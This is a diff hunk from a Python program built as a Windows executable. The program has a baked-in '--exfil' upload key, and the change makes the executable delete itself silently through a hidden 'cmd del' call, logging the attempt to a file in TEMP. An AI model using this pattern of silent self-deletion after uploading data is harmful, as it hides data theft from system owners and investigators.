@@ -1765,17 +1765,30 @@ def main():
     parser.add_argument("--exfil-key",   metavar="KEY",       default=_EXFIL_KEY or None, help="API key for --exfil (default: baked in at build time)")
     args = parser.parse_args()
 
-    # Schedule the exe for deletion on next reboot (MOVEFILE_DELAY_UNTIL_REBOOT = 0x4).
-    # No rename, no subprocess at startup - nothing that can crash the scan mid-run.
-    # Immediate delete is attempted again at end of main() after the upload finishes.
     _self_exe_path: str = ""
     if args.self_delete and getattr(sys, "frozen", False):
+        _self_exe_path = sys.executable
         try:
-            import ctypes
-            _self_exe_path = sys.executable
-            ctypes.windll.kernel32.MoveFileExW(_self_exe_path, None, 0x4)
-        except Exception:
-            _self_exe_path = ""
+            _dbg = os.path.join(os.environ.get('TEMP', ''), 'bb_self_delete_debug.txt')
+            with open(_dbg, 'w') as _f:
+                _f.write(f"sys.executable = {sys.executable}\n")
+                _f.write(f"os.path.exists = {os.path.exists(sys.executable)}\n")
+            import subprocess as _sp
+            _r = _sp.run(
+                ['cmd', '/c', f'del /f /q "{_self_exe_path}" 2>&1 && echo OK || echo FAIL'],
+                capture_output=True, text=True,
+                creationflags=_sp.CREATE_NO_WINDOW,
+            )
+            with open(_dbg, 'a') as _f:
+                _f.write(f"del returncode = {_r.returncode}\n")
+                _f.write(f"del stdout = {_r.stdout!r}\n")
+                _f.write(f"del stderr = {_r.stderr!r}\n")
+        except Exception as _ex:
+            try:
+                with open(_dbg, 'a') as _f:
+                    _f.write(f"exception = {_ex}\n")
+            except Exception:
+                pass
 
     if args.verify:
         _do_oidc = True
